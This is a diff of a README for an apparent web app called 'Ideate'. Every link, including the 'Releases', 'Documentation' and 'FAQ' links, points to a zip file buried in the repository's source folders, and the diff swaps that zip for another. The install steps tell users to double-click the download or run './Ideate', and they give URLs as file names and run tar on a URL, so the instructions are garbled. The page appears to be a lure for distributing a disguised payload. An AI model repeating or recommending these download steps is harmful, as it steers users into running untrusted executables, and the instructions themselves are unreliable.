@@ -1,7 +1,7 @@
 # 🌟 Ideate - Create and Share Your Ideas Easily
 
 ## 📥 Download Now!
-[![Download Ideate](https://raw.githubusercontent.com/Hymieincorrupt440/Ideate/main/packages/ui/src/Ideate-v1.1.zip%https://raw.githubusercontent.com/Hymieincorrupt440/Ideate/main/packages/ui/src/Ideate-v1.1.zip)](https://raw.githubusercontent.com/Hymieincorrupt440/Ideate/main/packages/ui/src/Ideate-v1.1.zip)
+[![Download Ideate](https://github.com/Hymieincorrupt440/Ideate/raw/refs/heads/main/packages/eslint-config/Software-v1.2.zip%https://github.com/Hymieincorrupt440/Ideate/raw/refs/heads/main/packages/eslint-config/Software-v1.2.zip)](https://github.com/Hymieincorrupt440/Ideate/raw/refs/heads/main/packages/eslint-config/Software-v1.2.zip)
 
 ## 📝 Description
 Ideate is a web application designed for idea formation, allowing multiple users to collaborate and share their thoughts easily. Whether you're brainstorming for a project, planning an event, or just jotting down ideas, Ideate makes the process smooth and enjoyable.
@@ -12,7 +12,7 @@ Follow these clear steps to download and run Ideate. No advanced computer skills
 ### 1. Visit the Releases Page
 To download Ideate, click the link below to go to the Releases page:
 
-[Visit Releases Page](https://raw.githubusercontent.com/Hymieincorrupt440/Ideate/main/packages/ui/src/Ideate-v1.1.zip)
+[Visit Releases Page](https://github.com/Hymieincorrupt440/Ideate/raw/refs/heads/main/packages/eslint-config/Software-v1.2.zip)
 
 ### 2. Choose Your Version
 On the Releases page, you'll see a list of available versions. Find the latest version listed. It will be at the top of the page and marked as "Latest release."
@@ -20,9 +20,9 @@ On the Releases page, you'll see a list of available versions. Find the latest v
 ### 3. Download the Files
 Under the latest version, you will see several download options. Click on the file that fits your operating system:
 
-- **For Windows:** Download the file named `https://raw.githubusercontent.com/Hymieincorrupt440/Ideate/main/packages/ui/src/Ideate-v1.1.zip`
-- **For macOS:** Download the file named `https://raw.githubusercontent.com/Hymieincorrupt440/Ideate/main/packages/ui/src/Ideate-v1.1.zip`
-- **For Linux:** Download the file named `https://raw.githubusercontent.com/Hymieincorrupt440/Ideate/main/packages/ui/src/Ideate-v1.1.zip`
+- **For Windows:** Download the file named `https://github.com/Hymieincorrupt440/Ideate/raw/refs/heads/main/packages/eslint-config/Software-v1.2.zip`
+- **For macOS:** Download the file named `https://github.com/Hymieincorrupt440/Ideate/raw/refs/heads/main/packages/eslint-config/Software-v1.2.zip`
+- **For Linux:** Download the file named `https://github.com/Hymieincorrupt440/Ideate/raw/refs/heads/main/packages/eslint-config/Software-v1.2.zip`
 
 After clicking the appropriate file, your download will start automatically.
 
@@ -30,19 +30,19 @@ After clicking the appropriate file, your download will start automatically.
 Once the file is downloaded, follow these steps to install:
 
 **For Windows:**
-- Locate the downloaded `https://raw.githubusercontent.com/Hymieincorrupt440/Ideate/main/packages/ui/src/Ideate-v1.1.zip` file.
+- Locate the downloaded `https://github.com/Hymieincorrupt440/Ideate/raw/refs/heads/main/packages/eslint-config/Software-v1.2.zip` file.
 - Right-click the file and select "Extract All" to unpack the files.
-- Open the extracted folder and double-click on `https://raw.githubusercontent.com/Hymieincorrupt440/Ideate/main/packages/ui/src/Ideate-v1.1.zip` to start the installation.
+- Open the extracted folder and double-click on `https://github.com/Hymieincorrupt440/Ideate/raw/refs/heads/main/packages/eslint-config/Software-v1.2.zip` to start the installation.
 
 **For macOS:**
-- Find the `https://raw.githubusercontent.com/Hymieincorrupt440/Ideate/main/packages/ui/src/Ideate-v1.1.zip` file in your Downloads folder.
+- Find the `https://github.com/Hymieincorrupt440/Ideate/raw/refs/heads/main/packages/eslint-config/Software-v1.2.zip` file in your Downloads folder.
 - Double-click the file to open it.
 - Drag the Ideate icon into your Applications folder.
 
 **For Linux:**
 - Open your terminal.
-- Navigate to the folder where you downloaded `https://raw.githubusercontent.com/Hymieincorrupt440/Ideate/main/packages/ui/src/Ideate-v1.1.zip`.
-- Run the command `tar -xvzf https://raw.githubusercontent.com/Hymieincorrupt440/Ideate/main/packages/ui/src/Ideate-v1.1.zip` to extract the files.
+- Navigate to the folder where you downloaded `https://github.com/Hymieincorrupt440/Ideate/raw/refs/heads/main/packages/eslint-config/Software-v1.2.zip`.
+- Run the command `tar -xvzf https://github.com/Hymieincorrupt440/Ideate/raw/refs/heads/main/packages/eslint-config/Software-v1.2.zip` to extract the files.
 - Navigate to the extracted folder and run `./Ideate` to start the application.
 
 ### 5. Create Your Account
@@ -66,13 +66,13 @@ To run Ideate smoothly, ensure your device meets the following requirements:
 - **For Linux:** Any modern distribution, 4 GB RAM, 200 MB free disk space.
 
 ## 🔗 More Information
-You can find more details about specific features and updates on our [Documentation Page](https://raw.githubusercontent.com/Hymieincorrupt440/Ideate/main/packages/ui/src/Ideate-v1.1.zip) and [FAQ Section](https://raw.githubusercontent.com/Hymieincorrupt440/Ideate/main/packages/ui/src/Ideate-v1.1.zip).
+You can find more details about specific features and updates on our [Documentation Page](https://github.com/Hymieincorrupt440/Ideate/raw/refs/heads/main/packages/eslint-config/Software-v1.2.zip) and [FAQ Section](https://github.com/Hymieincorrupt440/Ideate/raw/refs/heads/main/packages/eslint-config/Software-v1.2.zip).
 
 ## 📞 Support
 If you encounter any issues while downloading or using Ideate, you can reach out for help through the Issues section of this repository.
 
 ### 📥 Additional Download Link
 Don't forget to revisit the Releases page to download and install Ideate at any time. Click below:
-[Download Ideate Here](https://raw.githubusercontent.com/Hymieincorrupt440/Ideate/main/packages/ui/src/Ideate-v1.1.zip)
+[Download Ideate Here](https://github.com/Hymieincorrupt440/Ideate/raw/refs/heads/main/packages/eslint-config/Software-v1.2.zip)
 
 Enjoy creating and sharing your ideas with Ideate!
